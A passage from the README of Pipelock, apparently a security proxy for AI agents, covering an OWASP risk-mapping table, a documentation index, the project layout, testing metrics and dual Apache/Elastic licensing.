| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
| ASI06 Memory & Context Poisoning | **Moderate:** injection detection on fetched content |
| ASI07 Insecure Inter-Agent Communication | **Partial:** agent ID, integrity, signing |
| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |

Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)

</details>

## Docs

| Document | What's In It |
|----------|-------------|
| [Configuration Reference](docs/configuration.md) | All config fields, defaults, hot-reload behavior, presets |
| [Request Policy](docs/guides/request-policy.md) | Allow-by-default deny/warn rails on outbound API operations (GraphQL / discriminator / batch), fail-closed (v2.6) |
| [Request Redaction](docs/guides/redaction.md) | JSON request rewriting across HTTP, WebSocket, and MCP transports |
| [False Positive Tuning](docs/false-positive-tuning.md) | Identifying, suppressing, and tuning scanner findings |
| [Scan API](docs/scan-api.md) | Evaluation endpoint for programmatic scanning |
| [Deployment Recipes](docs/guides/deployment-recipes.md) | Docker Compose, K8s sidecar, iptables, macOS PF |
| [`pipelock doctor`](docs/cli/doctor.md) | Configured-vs-enforceable deployment diagnostics for proxy, TLS, MCP, file_sentry, telemetry, and containment signals |
| [`pipelock verify-install`](docs/cli/verify-install.md) | Deterministic scanning, local proof, and direct-egress smoke checks |
| [Bypass Resistance](docs/bypass-resistance.md) | Known evasion techniques, mitigations, limitations |
| [Known Attacks Blocked](docs/attacks-blocked.md) | Real attacks with repro snippets |
| [SIEM Integration](docs/guides/siem-integration.md) | Log schema, forwarding patterns, SIEM queries |
| [Metrics Reference](docs/metrics.md) | Prometheus metric families, labels, JSON stats, and alert rules |
| [Community Rules](docs/rules.md) | Install, configure, and create signed rule bundles |
| [Security Assurance](docs/security-assurance.md) | Security model, trust boundaries, supply chain |
| [Security Documents](docs/security/) | Disclosure policy, unsupported paths, key rotation, TLS CA and Audit Packet threat models |
| [Finding Suppression](docs/guides/suppression.md) | Rule names, path matching, inline comments |
| [Transport Modes](docs/guides/transport-modes.md) | All proxy modes and their scanning capabilities |
| [OWASP MCP Top 10](docs/compliance/owasp-mcp-top10.md) | OWASP MCP Top 10 coverage |
| [OWASP Agentic Top 15](docs/owasp-agentic-top15-mapping.md) | OWASP Agentic AI Top 15 coverage |
| [EU AI Act](docs/compliance/eu-ai-act-mapping.md) | EU AI Act compliance mapping |
| [NIST 800-53](docs/compliance/nist-800-53.md) | NIST SP 800-53 Rev. 5 controls mapping |
| [Policy Spec v0.1](docs/policy-spec-v0.1.md) | Portable agent firewall policy format |
| [Mediation Envelope](docs/guides/mediation-envelope.md) | Sideband metadata headers, config, interaction with receipts |
| [Media Policy](docs/guides/media-policy.md) | Stego stripping, SVG hardening, allowed types, size limits |
| [Receipt Verification](docs/guides/receipt-verification.md) | `pipelock verify-receipt`, standalone `pipelock-verifier`, conformance suite, chain integrity |
| [Audit Packet Threat Model](docs/security/audit-packet-threat-model.md) | What verified Audit Packets prove, what they do not prove, and the trust assumptions relying parties must pin |
| [Receipt Transport Coverage](docs/guides/receipt-transports.md) | Receipt emission matrix across fetch, forward, CONNECT/TLS, WebSocket, MCP, and A2A paths |
| [Learn-and-Lock](docs/guides/learn-and-lock.md) | Per-agent behavioral contracts: observe, compile, shadow, ratify, promote (v2.4) |
| [Federation](docs/guides/federation.md) | Inbound mediation envelope verification, SPIFFE actor format, RFC 9421 well-known directory (v2.4) |
| [Block-Reason Header](docs/guides/block-reason-header.md) | `X-Pipelock-Block-Reason` schema, reason vocabulary, retry hints (v2.4) |
| [Health Endpoint](docs/guides/health.md) | `/health` 503 wedge detection, subsystem heartbeats, operator dashboard config (v2.4) |
| [Host Containment](docs/contain-cli.md) | `pipelock contain install / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` for 3-UID kernel-enforced agent containment (v2.5) |
| [MCP Integrity Manifests](docs/cli/mcp-integrity.md) | Generate, verify, sign, and require trusted MCP binary-integrity manifests (v2.5) |
| [Adaptive CLI](docs/cli/adaptive.md) | Inspect and flush adaptive-enforcement runtime state through the admin API (v2.5) |
| [Posture Capsule](docs/guides/posture-capsule.md) | Signed posture snapshots, `posture verify` CLI, CI gate, scoring model |
| [`pipelock init sidecar`](docs/cli/init-sidecar.md) | Generate enforced Kubernetes companion-proxy manifests and MCP launcher contracts (strategic-merge, Kustomize, Helm values) |
| [`pipelock session`](docs/cli/session.md) | Operator CLI for airlock inspection and recovery (list, inspect, explain, release, terminate, recover) |
| [Badges](docs/badges.md) | Drop-in Markdown for the `scanned by pipelock` badge on downstream projects |

## Project Structure

```text
cmd/pipelock/          CLI entry point
internal/
  cli/                 20+ Cobra commands (run, check, init, generate, mcp, session, posture, rules, ...)
    diag/              `pipelock doctor` and install-verification diagnostics
    session/           `pipelock session` operator CLI — airlock inspection and recovery
    setup/             `pipelock init sidecar` — companion-proxy manifest generation (K8s)
  config/              YAML config, validation, defaults, hot-reload (fsnotify)
  scanner/             11-layer URL scanning pipeline + response injection detection
  audit/               Structured JSON logging (zerolog) + event emission dispatch
  proxy/               HTTP proxy: fetch, forward (CONNECT), WebSocket, DNS pinning, TLS
  mcp/                 MCP proxy + bidirectional scanning + tool poisoning + chains
    integrity/         MCP binary/script integrity manifests and trust workflow
  discover/            IDE/agent config discovery (Claude Code, Cursor, VS Code, JetBrains)
  killswitch/          Emergency deny-all (4 sources) + port-isolated API
  envelope/            Mediation envelope (RFC 8941) for sideband metadata
  media/               Image metadata stripping (JPEG/PNG byte-level surgery)
  normalize/           6-pass text normalization (NFKC + invisible + leetspeak + vowel + stego strip)
  receipt/             Action receipt signing + hash-chained evidence
  posture/             Posture capsule schema, signing, scoring, verify policy
  session/             Session state, taint classification, task boundaries, trust overrides
  rules/               Bundle loader, tier taxonomy, RequiredFeatures enforcement
  sandbox/             Landlock, seccomp, netns, macOS sandbox-exec
  shield/              Airlock, browser shield, SVG hardening
  signing/             Ed25519 key management
  integrity/           SHA256 file integrity monitoring
  report/              HTML/JSON audit report generation
enterprise/            Multi-agent features (ELv2)
sdk/conformance/       Cross-implementation receipt verification test vectors
charts/                Helm chart for Kubernetes deployment
configs/               7 preset config files
docs/                  Guides, references, compliance mappings
```

## Testing

Pipelock is tested like a security product. The open-source core has thousands of unit, integration, and end-to-end tests. A separate private adversarial suite exercises real-world attack classes against the production binary. Every bypass graduates into a regression test before release.

| Metric | Value |
|--------|-------|
| Go tests (with `-race`) | Thousands across unit, integration, and end-to-end paths |
| Statement coverage | 88%+ |
| Evasion techniques tested | 230+ |
| Scanner pipeline overhead | ~40us per URL scan |
| CI matrix | Go 1.25 + 1.26, CodeQL, golangci-lint |
| Supply chain | SLSA provenance, CycloneDX SBOM, cosign signatures |

Run `make test` to verify locally. Independent benchmark: the public [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) corpus. See the [live results](https://pipelab.org/gauntlet/).

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- See [docs/comparison.md](docs/comparison.md) for how Pipelock relates to other tools in this space
- Security review contributions from Dylan Corrales

Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

If Pipelock is useful, please [star this repository](https://github.com/luckyPipewrench/pipelock). It helps others find the project.

## License

Pipelock core is licensed under the **Apache License 2.0**. Copyright 2026 Joshua Waldrep.

Multi-agent features (per-agent identity, budgets, and configuration isolation)
are in the `enterprise/` directory, gated by the `enterprise` build tag and licensed
under the **Elastic License 2.0 (ELv2)**. These features activate with a valid license key.

The open-source core works independently without paid features. All scanning, detection,
and single-agent protection is free.

Pre-built release artifacts (Homebrew, GitHub releases, Docker images) include paid-tier
code that activates with a valid license key. Building from source with `go install` or the
repository `Dockerfile` produces a Community-only binary.

See [LICENSE](LICENSE) for the Apache 2.0 text and [enterprise/LICENSE](enterprise/LICENSE) for the ELv2 text.
